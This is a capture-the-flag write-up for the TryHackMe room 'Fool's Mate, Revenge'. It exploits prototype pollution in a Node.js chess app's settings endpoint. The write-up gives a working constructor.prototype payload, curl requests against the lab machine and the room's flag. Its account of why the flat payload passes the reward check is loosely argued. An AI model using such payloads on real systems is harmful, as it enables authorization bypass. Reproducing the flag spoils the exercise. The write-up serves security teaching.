# Fool’s Mate, Revenge

**Room:** [Fool’s Mate, Revenge](https://tryhackme.com/room/foolsm8v2)  
**Difficulty:** Hard

## Executive Summary

This room is a good example of why **server-side validation alone doesn't automatically make an application secure**.

The original _Fool’s Mate_ challenge relied on client-side protections that could be bypassed by communicating directly with the backend. In _Fool’s Mate, Revenge_, those checks have been moved server-side—but the new implementation introduces a different vulnerability.

The application contains a **prototype pollution** flaw in its preference-saving functionality. By manipulating the JavaScript object prototype through the `/api/settings` endpoint, we can influence a server-side authorization check and unlock the reward.

The attack chain is:

```text
/api/move
    ↓
Server correctly detects checkmate
    ↓
Reward is locked by session.config.unlocked
    ↓
Inspect /api/settings
    ↓
Identify unsafe deep merge
    ↓
Prototype pollution via constructor.prototype
    ↓
session.config becomes truthy through inheritance
    ↓
Repeat winning chess move
    ↓
Flag
```

---

# 1. Understanding the Application

The application is running on port `3000` and presents a chess position where White has an obvious mate-in-one.

The winning move is:

```text
Ra1 → a8
```

or, in the API's coordinate format:

```text
a1a8
```

In the original room, directly calling the backend was enough to bypass the client-side protection.

This time, that doesn't work.

Sending the winning move directly to the API produces something like:

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "turn": "b",
  "winner": "white",
  "locked": true,
  "message": "Checkmate! No reward for you.",
  "reason": "reward gate closed: session.config.unlocked is not set"
}
```

This is actually extremely useful.

The chess logic is working correctly—the server recognizes the checkmate—but the **reward gate** prevents the flag from being returned.

The important part is:

```text
session.config.unlocked
```

So instead of trying to break the chess logic, the interesting question becomes:

> **Can we influence the server-side session configuration?**

---

# 2. Investigating the New Attack Surface

The application now has a **Preferences** section allowing the user to change things such as:

- Theme
    
- Piece set
    
- Animation speed
    

That means the browser must send those settings back to the server.

The JavaScript reveals exactly how:

```bash
curl -s http://<MACHINE_IP>:3000/js/app.js
```

The relevant function is:

```javascript
async function savePrefs() {
  const prefs = {
    theme: themeSelect.value,
    pieceSet: pieceSetSelect.value,
    animationMs: Number(animSelect.value)
  };

  try {
    const res = await fetch('/api/settings', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(prefs)
    });

    const data = await res.json();

    if (data && data.preferences)
      applyPrefs(data.preferences);
  } catch (e) {}
}
```

So the browser sends JSON to:

```text
POST /api/settings
```

with a structure similar to:

```json
{
  "theme": "forest",
  "pieceSet": "classic",
  "animationMs": 180
}
```

At this point, the important thing isn't the legitimate preference values.

It's **how the server merges them into its existing objects**.

---

# 3. The Vulnerability: Prototype Pollution

The backend is using a recursive object-merging routine.

That becomes dangerous when attacker-controlled JSON keys are allowed to contain JavaScript's special object properties, particularly:

```text
__proto__
constructor
prototype
```

In Node.js, objects inherit properties through their prototype chain.

Conceptually:

```text
session
   ↓
Object.prototype
   ↓
Inherited properties
```

If an application accidentally modifies `Object.prototype`, properties that weren't explicitly placed on individual objects can nevertheless appear when those objects are accessed.

That is the essence of **prototype pollution**.

And here, the interesting target is:

```text
session.config
```

because the reward logic eventually checks:

```text
session.config.unlocked
```

---

# 4. The First Exploit Attempt

The obvious payload is to try to create the entire structure:

```json
{
  "constructor": {
    "prototype": {
      "config": {
        "unlocked": true
      }
    }
  }
}
```

However, sending a nested structure like this causes the application's recursive merge routine to blow up.

The server responds with an error similar to:

```text
RangeError: Maximum call stack size exceeded
    at deepMerge (/opt/ctf/chess-e2/server.js:28:19)
```

This is an important discovery.

It tells us that:

1. The application is recursively processing nested objects.
    
2. `constructor.prototype` is reaching the dangerous prototype path.
    
3. Our nested `config` object causes recursive processing.
    
4. We need a payload that achieves the desired state **without creating another nested object beneath `config`**.
    

---

# 5. Flattening the Payload

Look closely at the reward condition:

```text
session.config.unlocked
```

We don't necessarily need to create:

```javascript
config = {
    unlocked: true
}
```

If we can make:

```javascript
session.config
```

itself truthy, the application's check can proceed to the `.unlocked` property.

Because JavaScript follows the prototype chain when a property isn't present directly on an object, we can target the prototype with a **flat value**:

```json
{
  "constructor": {
    "prototype": {
      "config": true
    }
  }
}
```

The important difference is:

### ❌ Nested version

```text
config → { unlocked → true }
```

### ✅ Flat version

```text
config → true
```

This avoids the recursive object-processing problem.

---

# 6. Sending the Prototype Pollution Payload

Send the request to `/api/settings`:

```bash
curl -X POST http://<MACHINE_IP>:3000/api/settings \
     -H "Content-Type: application/json" \
     -d '{"theme":"forest","pieceSet":"classic","animationMs":180,"constructor":{"prototype":{"config":true}}}'
```

A successful response looks like:

```json
{
  "ok": true,
  "preferences": {
    "theme": "forest",
    "pieceSet": "classic",
    "animationMs": 180
  }
}
```

Notice something interesting:

The response only shows the legitimate preference fields.

The malicious property isn't reflected in the returned preferences, but the important operation has already occurred on the server.

The polluted prototype now supplies:

```text
config = true
```

to objects that don't have their own `config` property.

Therefore, when the reward logic later evaluates:

```text
session.config.unlocked
```

the first lookup finds the inherited `config` value.

The application no longer reaches the previous:

```text
reward gate closed
```

condition.

---

# 7. Triggering the Reward

Now perform the original winning chess move again:

```bash
curl -X POST http://<MACHINE_IP>:3000/api/move \
     -H "Content-Type: application/json" \
     -d '{"from":"a1","to":"a8"}'
```

This time the server accepts the checkmate **and** returns the reward.

The response contains:

```json
{
  "ok": true,
  "move": "a1a8",
  "status": "checkmate",
  "winner": "white",
  "flag": "THM{pr0t0_p0lluted_th3_r3f3r33}"
}
```

## Flag

```text
THM{pr0t0_p0lluted_th3_r3f3r33}
```

---

# 8. What Actually Happened?

The important part of the exploit isn't really the chess move.

The chess move was valid from the beginning.

The real attack was:

```text
User-controlled JSON
        ↓
/api/settings
        ↓
Unsafe recursive merge
        ↓
constructor.prototype
        ↓
Object prototype modified
        ↓
session.config resolves through inheritance
        ↓
Reward authorization check changes
        ↓
/a1 → a8
        ↓
Flag
```

The application tried to fix the original challenge by moving authorization to the backend.

That part worked.

But the backend then trusted attacker-controlled object keys while merging configuration data, creating a completely different path around the authorization logic.

---

# 9. Why the First Payload Crashed

This is probably the most interesting technical detail in the room.

The tempting payload was:

```json
{
  "constructor": {
    "prototype": {
      "config": {
        "unlocked": true
      }
    }
  }
}
```

The application recursively processes objects.

By introducing another object beneath the polluted prototype, the merge routine ends up recursively walking a structure that refers back into the prototype hierarchy.

Eventually:

```text
deepMerge()
  → deepMerge()
    → deepMerge()
      → deepMerge()
        → ...
```

until Node.js throws:

```text
RangeError: Maximum call stack size exceeded
```

Changing:

```json
"config": {
    "unlocked": true
}
```

to:

```json
"config": true
```

removes the problematic nested structure while still influencing the later authorization check.

That's the key trick.

---

# 10. Key Lessons

### 1. Server-side validation isn't automatically secure

Moving a check from JavaScript into the backend is normally the right architectural direction, but the backend itself still has to handle untrusted input safely.

---

### 2. Configuration endpoints deserve security testing

Endpoints that appear harmless—such as:

```text
/api/settings
```

—can become dangerous if they accept arbitrary JSON objects and merge them into server-side state.

---

### 3. Watch for dangerous JavaScript keys

When auditing Node.js applications, these deserve particular attention:

```text
__proto__
constructor
prototype
```

Especially when they reach recursive merge, clone, or configuration functions.

---

### 4. Errors can reveal implementation details

The:

```text
Maximum call stack size exceeded
```

error wasn't just a failure.

It revealed that the backend was recursively processing the supplied object and helped identify the vulnerable merge behavior.

---

### 5. Understand the exact authorization condition

The most important clue in the entire room was:

```text
session.config.unlocked is not set
```

Rather than attacking the chess engine itself, we followed the application's own error message back to the state controlling the reward.

---

### 6. Prototype pollution can affect unrelated objects

The dangerous property of prototype pollution is that the attacker isn't necessarily modifying the object they originally submitted.

They can modify the shared prototype from which other objects inherit.

Conceptually:

```text
Object.prototype
       │
       ├── config = true
       │
       ↓
    session
       │
       └── session.config
             ↓
        inherited value
```

That is what makes prototype pollution particularly interesting in server-side JavaScript applications.

---

# Final Takeaway

**Fool’s Mate, Revenge** is essentially a lesson in following an application's data flow.

The first challenge taught:

```text
Don't trust client-side security.
```

This challenge adds the next lesson:

```text
Don't trust server-side object merging either.
```

The winning move wasn't the exploit. The real exploit was manipulating the application's object model so that its own server-side authorization check evaluated differently.

**Flag:**

```text
THM{pr0t0_p0lluted_th3_r3f3r33}
```